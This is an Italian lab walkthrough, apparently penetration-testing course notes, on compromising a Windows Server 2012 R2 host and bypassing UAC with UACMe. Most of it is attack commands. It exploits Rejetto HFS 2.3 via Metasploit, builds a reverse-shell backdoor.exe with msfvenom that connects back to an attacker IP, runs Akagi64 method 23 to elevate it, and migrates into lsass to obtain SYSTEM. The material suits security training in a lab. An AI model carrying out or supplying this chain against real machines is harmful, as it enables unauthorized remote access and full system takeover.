# Bypassing UAC with UACMe

<figure><img src="../../.gitbook/assets/image (423).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (424).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (425).png" alt=""><figcaption></figcaption></figure>

UACMe è una lista di metodi per bypassare l'UAC, attraverso un eseguibile da mettere sul target che può eseguire un payload.

## Come funziona UAC su un sistema Windows

<figure><img src="../../.gitbook/assets/image (427).png" alt=""><figcaption></figcaption></figure>

Su questa macchina c'è un account IEUser che fa parte del gruppo administrators

Infatti se lancio un programma come amministratore (es. cmd) mi esce la finestra UAC:

<figure><img src="../../.gitbook/assets/image (428).png" alt=""><figcaption></figcaption></figure>

Con un account non nel gruppo administrators sarebbe apparso l'UAC prompt con username e password da inserire di un amministratore.

### Livelli UAC

<figure><img src="../../.gitbook/assets/image (430).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (429).png" alt=""><figcaption></figcaption></figure>

In una installazione standard l'UAC non è mai settato al valore massimo.

Al livello massimo è difficile da bypassare:

<figure><img src="../../.gitbook/assets/image (431).png" alt=""><figcaption></figcaption></figure>

## Bypass UAC via standard command shell (cmd) oppure meterpeter session

<figure><img src="../../.gitbook/assets/image (432).png" alt=""><figcaption></figcaption></figure>

```
nmap 10.2.22.220
```

<figure><img src="../../.gitbook/assets/image (433).png" alt=""><figcaption></figcaption></figure>

Facendo una scansione del target con nmap vediamo che c'è un webserver sulla porta 80.

<figure><img src="../../.gitbook/assets/image (434).png" alt=""><figcaption></figcaption></figure>

Il server è HFS sviluppato da rejetto nella versione 2.3, che è vulnerabile e quindi exploiteremo questa vulnerabilità con MSF per avere accesso alla macchina target.

### Exploit vulnerabilità webserver HFS 2.3 per avere accesso al target

```
service postgresql start && msfconsole
setg RHOSTS 10.2.22.220
search rejetto
use exploit/windows/http/rejetto_hfs_exec
show options
// Eventualmente settare TARGETURI ma in questo caso il servizio vulnerabile gira sulla root del webserver
exploit
```

<figure><img src="../../.gitbook/assets/image (435).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (436).png" alt=""><figcaption></figcaption></figure>

Viene impostato il payload di default per windows 32 bit, e ci va bene.

<figure><img src="../../.gitbook/assets/image (437).png" alt=""><figcaption></figcaption></figure>

Eventualmente settare TARGETURI ma in questo caso il servizio vulnerabile gira sulla root del webserver

<figure><img src="../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

E abbiamo accesso alla macchina vittima, ora facciamo un minimo di enumeration per capire che sistema è.

### Dopo aver avuto accesso alla vittima

```
sysinfo //versione windows e vediamo che meterpreter gira su un processo a 32 bit
pgrep explorer //es. risultato 2448
migrate 2448 //Migriamo su la meterpreter shell su un processo a 64 bit
sysinfo
getuid
getprivs
shell
net user //ci fa vedere che account ci sono
net localgroup administrators //vediamo che l'utente admin fa parte del gruppo
net user admin password123 //ci da errore perché dobbiamo bypassare UAC

```

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Si tratta di Windows Server 2012 R2 (6.3 build 9600).

Siccome la meterpreter shell gira su un processo a 32 bit la migriamo su uno a 64 bit, ad esempio il processo explorer.

E a questo punto vediamo che effettivamente la sessione di meterpreter è a 64 bit.

Controlliamo che utente stiamo usando e scopriamo che è un utente di nome admin, ma non è l'administrator di default di Windows.

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

In questo momento l'utente ha pochi privilegi ma ciò non significa che non possa eseguire come amministratore se fa parte del gruppo administrators

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Con net user vediamo che ci sono solo due account in pratica: admin e Administrator

Con il comando net localgroup administators possiamo vedere che fanno parte del gruppo administrators l'account admin e Administrator. Quindi l'utente admin che stiamo usando è nel gruppo.

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Se proviamo ad eseguire questo comando per cambiare la password ci dà errore perché dovremmo confermare con il prompt UAC, ma da cmd ovviamente non può essere fatto, quindi bisogna bypassare l'UAC.

### Ora guardiamo UACMe

Per usarlo dobbiamo eseguire il file akagi32 seguito da una key che sarebbe il tipo di "script" da eseguire che dipende dalla versione di windows del target e la tecnica più adatta allo scenario, seguito dai parametri.

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

I file eseguibili si trovano a questo percorso:

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

In questo caso usiamo il metodo 23 che è quello che funziona di più.

<figure><img src="../../.gitbook/assets/image (12) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (13) (1) (1).png" alt=""><figcaption></figcaption></figure>

Per usarlo bisogna compilare i file C, non ci vengono forniti i file compilati.

A fini del laboratorio abbiamo già il file pronto di Akagai64 sul Desktop della nostra macchina Kali attaccante, dobbiamo trasferirlo sulla vittima.\
Il file lo troviamo su Desktop/tools/UACME/Akagai64.exe

<figure><img src="../../.gitbook/assets/image (14) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Attacco con msfvenom + UACMe per bypassare l'UAC

COSA FAREMO

1. Generiamo un meterpeter payload con msfvenom
2. Lo trasferiamo al target
3. Usiamo l'akagai executable con la Key (metodo) numero 23
4. Eseguiamo il meterpreter payload che dovrebbe bypassare l'UAC
5. Ci verrà fornita una elevated meterpreter session sul nostro listener

### Generiamo il payload e apriamo un listener

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT=1234 -f exe > backdoor.exe
//LHOST è il nostro IP attaccante
ls
msfconsole //apriamo una nuova sessione MSF per impostare un listneer
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.5.2
set LPORT 1234
run
// e qui rimane in attesa di qualche collegamento, rimane listening. 
// Cambiamo finestra del terminale per fare le prossime operazioni
```

<figure><img src="../../.gitbook/assets/image (15) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (16) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Carichiamo il payload generato sul target e lo eseguiamo per ricevere una reverse shell

Torniamo sulla sessione meterpreter aperta tramite l'exploit di prima, dove siamo utenti admin sul target

```
pwd
getuid
getprivs
cd C:\\
mkdir Temp
cd Temp
upload backdoor.exe
upload /root/Desktop/tools/UACME/Akagai64.exe
shell
dir
.\Akagi64.exe 23 C:\Temp\backdoor.exe
```

<figure><img src="../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (17) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (19) (1).png" alt=""><figcaption></figcaption></figure>

Se volessimo eseguire backdoor.exe direttamente non potremmo farlo perché l'UAC ci blocca.

Il metodo 23 che useremo con Akagai per bypassare l'UAC sfrutta il packetmanager per eseguire poi backdoor con permessi amministrativi senza UAC.

<figure><img src="../../.gitbook/assets/image (20) (1).png" alt=""><figcaption></figcaption></figure>



### Sessione con privilegi elevati aperta tramite reverse shell

Ora se andiamo a controllare la tab del terminale con il listener aperto vedremo la sessione meterpreter:

<figure><img src="../../.gitbook/assets/image (21) (1).png" alt=""><figcaption></figcaption></figure>

```
sysinfo //connessione aperta correttamente, processo a 32bit
getuid //siamo sempre utenti admin
getprivs //abbiamo ora molti più privilegi
ps //guardiamo i processi attivi, e possiamo migrare a quelli SYSTEM
migrate 688 //processo di lsass eseguito come SYSTEM
sysinfo //siamo passati a un processo a 64 bit, quello di lsass
getuid //abbiamo ora NT AUTHORITY\SYSTEM
```

Fino a qui abbiamo sempre l'utente admin, però se guardiamo i privilegi vedremo che abbiamo molti più privilegi perché è come se avessimo eseguito il file backdoor.exe come amministratore.

<figure><img src="../../.gitbook/assets/image (22) (1).png" alt=""><figcaption></figcaption></figure>

Ora però possiamo migrare a qualsiasi altro processo eseguito come SYSTEM dato che abbiamo i privilegi. Comando ps:

<figure><img src="../../.gitbook/assets/image (23) (1).png" alt=""><figcaption></figcaption></figure>

Ad esempio migriamo a lsass.exe

<figure><img src="../../.gitbook/assets/image (24) (1).png" alt=""><figcaption></figcaption></figure>

Abbiamo ora una sessione con utente SYSTEM, quindi privilegiata.

Siamo riusciti con successo ad elevare i nostri privilegi bypassando l'UAC, in particolare bypassando l'UAC su un sistema Windows 2012 R2.

## Conclusione e riflessione su UACMe

UACMe è complesso come strumento e ogni tecnica che si può utilizzare dipende dal sistema operativo. Bisogna fare un po' di test magari con delle VM con diverse versioni di Windows. Ovviamente meglio evitare le key/versioni che sono state fixate, meglio quelle che sono ancora unfixed.

<figure><img src="../../.gitbook/assets/image (25) (1).png" alt=""><figcaption></figcaption></figure>

Questa versione/metodo/key evidenziata in particolare è quella che solitamente l'istruttore utilizza con i sistemi Windows 10.
